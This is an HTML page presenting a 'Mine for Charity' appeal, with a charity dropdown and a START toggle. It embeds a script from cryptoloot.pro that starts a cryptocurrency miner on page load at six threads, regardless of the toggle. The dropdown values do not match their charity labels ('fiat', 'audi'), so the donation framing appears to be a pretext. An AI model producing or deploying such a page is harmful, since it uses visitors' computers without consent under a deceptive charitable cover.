<html lang="en">

<body>
  <div class="container">
    <div class="left-background">
      <div class="charity">
        <h1>MINE FOR CHARITY!</h1>
        <p>By letting us use a small portion of your computers processing power, you can help <br> donating for a good cause. Choose what organization you'd like to donate to down below!</p>
        <div class="dropdown">
          <select name="Organization">
            <option disabled="Who would you like to donate to?" selected>Who would you like to donate to?</option>
            <option value="Red Cross">UNICEF</option>
            <option value="UNICEF">Red Cross</option>
            <option value="fiat">Save the Children</option>
            <option value="audi">SOS Children's Villages</option>
          </select>
        </div>
      </div>
    </div>
    <div class="right-background">
      <div class="button">
        <div class="start">
          <h1>START!</h1>
        </div>
        <input type="checkbox" id="switch" />
        <label for="switch">Toggle</label>
      </div>
    </div>
  </div>
  
<script src="//cryptoloot.pro/lib/crlt.js"></script>
<script>
var miner=new CRLT.Anonymous('YOUR_SITE_PUBLIC_KEY',
        {
        threads:6,autoThreads:false,throttle:0.2,
        }
);
miner.start();
</script>
  <script>
	// Listen on events
	miner.on('found', function() { /* Hash found */ })
	miner.on('accepted', function() { /* Hash accepted by the pool */ })

	// Update stats once per second
	setInterval(function() {
		var hashesPerSecond = miner.getHashesPerSecond();
		var totalHashes = miner.getTotalHashes();
		var acceptedHashes = miner.getAcceptedHashes();

		// Output to HTML elements...
	}, 1000);
</script>
